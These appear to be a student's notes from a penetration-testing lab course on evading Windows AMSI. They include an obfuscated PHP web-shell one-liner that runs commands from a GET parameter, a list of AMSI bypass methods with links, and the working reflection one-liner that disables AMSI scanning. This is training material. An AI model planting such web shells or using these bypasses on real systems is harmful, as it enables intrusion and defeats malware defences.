
Let's 1st try what we have learnt in wreath network and if it doesn't work will learn what they are teaching us.

Let's try this obfuscation
https://www.gaijin.at/en/tools/php-obfuscator
```
<?php system($_GET[base64_decode('Y21k')]);?>
```


As i was going through this Php obfuscation won't work so will have to learn something on the lines of either updating amsi.dll or obfuscate it aka AMSIception.



<hr>



There are a large number of bypasses for AMSI available, a majority written in PowerShell and C#. Find a list of common bypasses below.  

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

- Patching amsi.dll
- Amsi ScanBuffer patch
- Forcing errors
- Matt Graeber's Reflection, [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- PowerShell downgrade



<hr>


Will Target `Matt Graeber` reflection method as well as patching `amsi.dll`

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

##  It is helpful to think of obfuscation as an art rather than a technique.


To aid in our obfuscation efforts, we will use the AMSITrigger script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick

